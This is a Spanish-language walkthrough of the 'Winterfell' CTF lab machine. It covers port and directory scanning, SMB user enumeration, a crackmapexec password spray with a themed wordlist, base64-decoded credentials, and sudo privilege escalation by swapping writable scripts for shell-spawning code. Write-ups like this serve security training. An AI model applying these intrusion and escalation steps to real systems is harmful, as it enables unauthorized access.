Maquina: Winterfell

Autor: Zunderrub

Dificultad: Facil

![Captura de pantalla 2025-01-08 080844](https://github.com/user-attachments/assets/526de997-277e-4655-b712-6729ce7863cb)

ping 172.17.0.2 -c 1 

![Captura de pantalla 2025-01-08 080928](https://github.com/user-attachments/assets/0ef4977f-7b08-4ec8-b122-f1b24e11eb5a)

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv 

![Captura de pantalla 2025-01-08 081029](https://github.com/user-attachments/assets/b897e695-8c4b-4b1d-9c10-42329ec6c4e6)

Vamos a la web, observamos la página de inicio que indica diario de Jon y los botones del navbar son no funcionales

![Captura de pantalla 2025-01-08 084916](https://github.com/user-attachments/assets/34efd52c-ff7d-4731-9b74-5f40c561c740)

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2

![Captura de pantalla 2025-01-08 081059](https://github.com/user-attachments/assets/e57a1613-2953-4b8f-b12e-b5be8a62e224)

Hacemos un escaneo de directorios y encontramos uno que se llama /dragon

Agregamos el directorio a la dirección web y vemos un archivo llamado EpisodioT1, el cual contiene los títulos de la primera temporada de juego de tronos

![Captura de pantalla 2025-01-08 081151](https://github.com/user-attachments/assets/e74e89aa-6b6b-4a77-8696-1cd37883c64c)

smbclient -L 172.17.0.2

Listamos el puerto abierto de smb y vemos que no tenemos acceso

![Captura de pantalla 2025-01-08 081209](https://github.com/user-attachments/assets/02127a29-308a-475e-9a16-7b075f5f901a)

enum4linux 172.17.0.2

Necesitamos algún nombre usuario, usamos enum4linux para buscar usuarios validos para smb

encontramos el user jon

![Captura de pantalla 2025-01-08 081241](https://github.com/user-attachments/assets/1ec7ccb1-d71e-4494-972a-71660386a7ae)

![Captura de pantalla 2025-01-08 081334](https://github.com/user-attachments/assets/b2be5355-152a-4484-9860-0e6abceaf070)

extraemos el password para este usuario, podría ser alguno de los títulos que encontramos, creamos una lista

nano passwords.txt

seacercaelinvierno 
elcaminoreal 
lordnieve
tullidosbastardosycosasrotas 
elloboyelleon 
unacoronadeoro 
ganasomueres 
porelladodelapunta 
baelor 
fuegoyhielo

crackmapexec smb 172.17.0.2 -u jon -p passwords.txt

Usamos Crackmapexec y encontramos el password para jon:seacercaelinvierno

![Captura de pantalla 2025-01-08 081627](https://github.com/user-attachments/assets/9de6bdc6-e6e4-4d03-92a8-929c4eec4a1f)

smbclient \\\\172.17.0.2\\shared -U jon

![Captura de pantalla 2025-01-08 081714](https://github.com/user-attachments/assets/9e03b99f-d3a1-4a35-8b2c-1e3cd234a7cf)

Nos conectamos a SMB usando las credenciales y observamos que tenemos acceso a un directorio llamado proteccion_del_reino

ls

get proteccion_del_reino

Extraemos el archivo proteccion_del_reino en nuestra máquina local

![Captura de pantalla 2025-01-08 081801](https://github.com/user-attachments/assets/4fbfccbe-16bd-46f1-a75d-51b1f3e865ee)

cat proteccion_del_reino

Vemos que el texto contiene un password, que a primera vista podemos ver que se trata de base 64

![Captura de pantalla 2025-01-08 081819](https://github.com/user-attachments/assets/a11f030f-3b1d-4eec-8e5d-5b89ec3227b9)

echo "aGlqb2RlbGFuaXN0ZXI0" | base64 -d

Decodificamos el mensaje y vemos que el password es hijodelanister

![Captura de pantalla 2025-01-08 081834](https://github.com/user-attachments/assets/41c4a308-c8d4-40d4-91a0-bde8da7dea3c)

ssh jon@172.17.0.2

Nos conectamos por SSH con las credenciales

![Captura de pantalla 2025-01-08 081930](https://github.com/user-attachments/assets/4608ce5f-91c6-4232-9227-a0cd50e2aeaf)

ls

cat paraJon

sudo -l

Una vez dentro hacemos un ls y encontramos un archivo que contiene un mensaje sobre una herramienta, si hacemos un sudo -l podemos observar que podemos elevar privilegios como aria usando python3 y un archivo en Python que está oculto

ls -la

Listamos los archivos ocultos y si podemos observar el archivo.mensaje.py, al abrir el mensaje podemos ver que es un script que no nos ayudara mucho

![Captura de pantalla 2025-01-08 082009](https://github.com/user-attachments/assets/a1230086-e008-4c07-93f0-d63be8f80773)

rm -rf .mensaje.py

![Captura de pantalla 2025-01-08 082133](https://github.com/user-attachments/assets/e2d2e117-4c01-44e2-a313-a496737cd301)

nano .mensaje.py

import os;
os.system("/bin/bash")

![Captura de pantalla 2025-01-08 082732](https://github.com/user-attachments/assets/47242388-34b1-4c4f-a959-2a23d197a502)

sudo -u aria /usr/bin/python3 /home/jon/ .mensaje.py

![Captura de pantalla 2025-01-08 082743](https://github.com/user-attachments/assets/49083e2f-5d1e-4304-8fbd-6409df9e990a)

Vemos los permisos y vemos que no podemos editar el archivo, ya que no contamos con los permisos, lo que podemos hacer es eliminar el archivo y crear uno nuevo con el mismo nombre el cual contenga un comando para que nos genere una nueva shell. De esta manera podemos escalar privilegios como aria

sudo -l

Hacemos sudo -l y vemos que podemos escalar como daenerys

![Captura de pantalla 2025-01-08 084141](https://github.com/user-attachments/assets/3a380642-2d25-455d-a8ba-40d21427408c)

sudo -u daenerys ls /home/daenerys/

Lo que los binarios nos permiten es poder leer y listar archivos de propiedad de daenerys, listamos el directorio y podemos observar que tenemos un archivo llamado mensajeParajon

sudo -u daenerys cat /home/daenerys/mensajeParaJon

Leyendo el mensaje podemos ver que nos indica el password, el password debería ser drakaris

![Captura de pantalla 2025-01-08 084214](https://github.com/user-attachments/assets/20bf8196-71fa-40e9-9ea1-21102ac27954)

su daenerys

drakaris

![Captura de pantalla 2025-01-08 084241](https://github.com/user-attachments/assets/513553cf-21a1-4fae-b4e5-67d881fe25ee)

sudo -l

con este usuario buscamos como elevar privilegios y volvemos a realizar un sudo -l y podemos vemos que podemos usar bash y un archivo oculto

![Captura de pantalla 2025-01-08 084258](https://github.com/user-attachments/assets/bff51841-4619-409d-9344-6251b20c52aa)

cat /home/daenerys/.secret/.shell.sh

![Captura de pantalla 2025-01-08 084317](https://github.com/user-attachments/assets/85aaa4df-1124-410e-adf9-bef8c16754ac)

cd /home/daenerys/.secret/

ls

ls -la

leemos el archivo y es una bash que establece conexión con otra dirección IP, pero si observamos los permisos y esto lo tenemos nosotros, así que para elevar privilegios solo debemos editarlo

![Captura de pantalla 2025-01-08 084338](https://github.com/user-attachments/assets/04618182-d87f-4554-8403-ea911fb946d9)

nano .shell.sh

cat .shell.sh

#!/bin/bash

bash

![Captura de pantalla 2025-01-08 084708](https://github.com/user-attachments/assets/ba48a31f-611c-490a-8881-8cdc85e23009)

sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh

whoami

Para obtener el root solo modificamos el archivo y luego ejecutamos el archivo. De esta manera obtendríamos la shell con permisos de root.

![Captura de pantalla 2025-01-08 084729](https://github.com/user-attachments/assets/713f3ca3-2e4c-41c6-8a99-ae2aa63d496a)
